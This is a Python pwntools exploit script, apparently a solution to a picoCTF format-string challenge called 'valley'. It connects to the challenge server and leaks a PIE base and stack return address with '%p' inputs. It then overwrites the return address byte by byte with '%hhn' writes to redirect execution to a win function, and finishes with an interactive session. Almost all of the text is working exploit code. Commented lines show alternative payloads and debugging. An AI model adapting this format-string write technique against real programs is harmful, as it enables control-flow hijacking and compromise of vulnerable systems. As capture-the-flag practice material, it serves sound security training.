#! /usr/bin/python3
from pwn import *
elf=context.binary=ELF("./valley")
#p=process()
#6th arg is input
#23 ret
#21 pie leak
p=remote('shape-facility.picoctf.net', 49516)

p.recvline()
p.sendline(b"%21$p")
leak=(p.recvline().decode())
leak=leak[leak.index(":")+2:].strip()
base=int(leak,16)-5139
print(f"Base:{hex(base)}")
win=base+0x1269
p.sendline(b"%20$p")
ret=p.recvline().decode()
ret=ret[ret.index(":")+2:].strip()
ret=int(ret,16)-8
print(f"RET STACK : {(hex(ret))}")
print(f"WIN : {(hex(win))}")
firstByte=(win&0xff)
secondByte=(win>>8)&0xff
thirdByte=(win>>16)&0xff
fourthByte=(win>>24)&0xff
fifthByte = (win>>32)&0xff
sixthByte=(win>>40)&0xff
print(hex(firstByte),hex(secondByte),hex(thirdByte),hex(fourthByte),hex(fifthByte),hex(sixthByte))

# p.sendline(fmtstr_payload(6,{ret:firstByte}))
# p.sendline(fmtstr_payload(6,{ret+1:secondByte}))
# p.sendline(fmtstr_payload(6,{ret+2:thirdByte}))
# p.sendline(fmtstr_payload(6,{ret+3:fourthByte}))
# p.sendline(fmtstr_payload(6,{ret+4:fifthByte}))
# p.sendline(fmtstr_payload(6,{ret+5:sixthByte}))
p.sendline((f"%{firstByte}x%8$hhnAAAAA".encode() + pack(ret)))
p.sendline(f"%{secondByte}x%8$hhnAAAAA".encode() + pack(ret+1))
# with open("payload","wb") as f:
# 	f.write(f"%{0x69}x%8$hhnAAAAA".encode() + pack(0x7fffffffdc78))
# 	f.write(f"\n".encode())
# 	f.write(f"%{0x52}x%8$hhnAAAAA".encode() + pack(0x7fffffffdc78+1))
# gdb.attach(p,gdbscript='''
# 	b echo_valley
# 	r < payload''')

p.interactive()
